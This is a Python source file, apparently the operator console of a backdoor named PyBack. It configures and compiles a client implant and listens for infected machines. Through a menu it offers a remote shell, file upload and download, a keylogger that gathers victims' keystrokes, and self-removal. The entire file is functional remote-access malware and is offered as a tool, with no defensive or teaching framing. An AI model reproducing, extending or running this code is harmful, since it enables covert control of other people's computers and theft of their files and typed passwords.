#!/usr/bin/python

# import the required modules
import socket
import struct
import os


##############################################
#                                            #
#                   v0.2                     #
#           Coded by Omikrone                #
#   GitHub: https://github.com/Omikrone/     #
#                                            #
##############################################


class Server:  # class Server: define the server properties
    def __init__(self, sock, client=None):
        self.client = client

    def send(self, data):  # custom send function
        pkt = struct.pack('>I', len(data)) + data
        self.client.sendall(pkt)

    def recv(self):  # custom recv function
        pktlen = self.recvall(4)
        if not pktlen:
            return ""
        pktlen = struct.unpack('>I', pktlen)[0]
        return self.recvall(pktlen)

    def recvall(self, n):  # format the receipts packets
        packet = b''
        while len(packet) < n:
            frame = self.client.recv(n - len(packet))
            if not frame:
                return None
            packet += frame
        return packet


class Control(Server):

    def __init__(self, sock, client):
        super().__init__(sock, client)
        self.sock = sock
        self.client = client

    @staticmethod
    def help():  # help command: show the available commands
        print(
            """
        Here are the different available commands:

        \033[4mPyBack commands:\033[0m
        - background: Put the client session in background.
        - exit: Exit and kill the client session.
        - remove: Remove all the files and kill the client session.

        \033[4mExploit commands:\033[0m
        - cmd: Open a shell on the client machine.
        - upload: Upload a file to the client.
        - download: Download a file from the client.
        - keylogger [start/stop]: Start or stop a keylogger and get the file with the keylogs.
        \n
        """)

    def exit(self):
        self.send('exit'.encode())
        self.client.close()
        self.sock.close()
        exit()

    def remove(self):
        self.send("remove".encode())
        main_menu()

    def upload(self):  # upload command: upload a file to the client
        self.send("upload".encode())
        local_path = input("Please enter the path of your local file: ")
        try:
            with open(local_path, 'rb') as file:
                while True:
                    a = file.read(1024)
                    if not a:
                        break
                    self.send(a)
            self.send(local_path.split('/')[-1].encode())
            print('File sent successful!')
        except FileNotFoundError:
            print("File not found!")

    def download(self):  # download command: download a file from the client
        self.send("download".encode())
        client_path = input("Please enter the path of the client file: ")
        self.send(client_path.encode())
        file_content = self.recv()
        file_name = self.recv()
        with open(file_name, 'wb') as file:
            file.write(file_content)
        print("File received successful!")

    def cmd(self):  # cmd command: open a shell on the client machine
        os.system(clear)
        self.send('cmd'.encode())
        while True:
            directory = self.recv().decode()
            cmd = input(directory + ' ')
            if cmd != 'exit':
                self.send(cmd.encode())
                response = self.recv().decode('cp850').strip()
                print(response)
            else:
                self.send('exit'.encode())
                break

    def keylogger(self, option):  # keylogger command: save the keystrokes from the client
        self.send(f'keylogger {option}'.encode())
        if option == 'stop':
            print('Killing keylogger...')
            keylogs = self.recv().decode()
            with open('keylogs.txt', 'a') as file:
                file.write(keylogs)
            print("Keylogger is finished. All the keyboard logs are in the file 'keylogs.txt'.")
        elif option == 'start':
            print("Keylogger is starting...")

    def background(self):
        self.send("background".encode())
        main_menu()


def main_menu():  # define the main menu
    while True:
        os.system(clear)
        print("""
        1. Create and configure a backdoor
        2. Listen to a port and control a backdoor
        3. Exit
        """)
        choice = input("\n Enter your choice: ")
        if int(choice) == 1:
            create()
        if int(choice) == 2:
            listener()
        elif int(choice) == 3:
            exit()


def create():  # configure the client with ip and port
    os.system(clear)
    host = input("Enter the host/ip of the client: ")
    port = input("Enter the port of the client: ")
    exe = input("Do you want to create an executable (y/n): ")
    with open('data/client.py', 'r', encoding='utf8') as file:
        content = file.readlines()
    content[content.index("HOST = '127.0.0.1'\n")] = f"HOST = '{host}'\n"
    content[content.index("PORT = 51025\n")] = f"PORT = {port}\n"
    with open('data/client.py', 'w', encoding='utf8') as file:
        file.write(''.join(content))

    if exe == 'y':
        os.system(clear)
        print('Creating the executable... This may take a while.')
        os.system("pyinstaller -F data/client.py -c --distpath exe")
        print("Executable file successfully created in folder 'exe'!\n")
    else:
        print("Python file successfully created!\n")
    os.system('pause')


def listener():  # define the socket and listen for connections
    host = input("Enter your host/ip: ")
    port = int(input("Enter your port: "))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((host, port))
    sock.listen()
    print(f"\nServer {host} is listening on port {port}...")
    while True:
        client, address = sock.accept()
        control = Control(sock, client)
        print(f"Client {address[0]} on port {address[1]} is connected!")
        os.system('pause')
        interpreter(control)


def interpreter(control):  # wait for commands and interpret them
    os.system(clear)
    print("Enter a command or 'help', for a list of the available commands")
    while True:
        string = input('>>> ')
        command = string.split(' ')[0]
        if command == 'help':
            control.help()
        elif command == 'exit':
            control.exit()
        elif command == 'remove':
            control.remove()
        elif command == 'background':
            control.background()
        elif command == 'cmd':
            control.cmd()
        elif command == 'upload':
            control.upload()
        elif command == 'download':
            control.download()
        elif command == 'keylogger':
            if len(string.split()) == 1:
                print("Please specify an option for the keylogger (start/stop).")
            else:
                control.keylogger(string.split()[1])
        else:
            print("Command not found! Enter 'help' to see the available commands.")


if os.name == 'nt':
    clear = 'cls'
else:
    clear = 'clear'
main_menu()
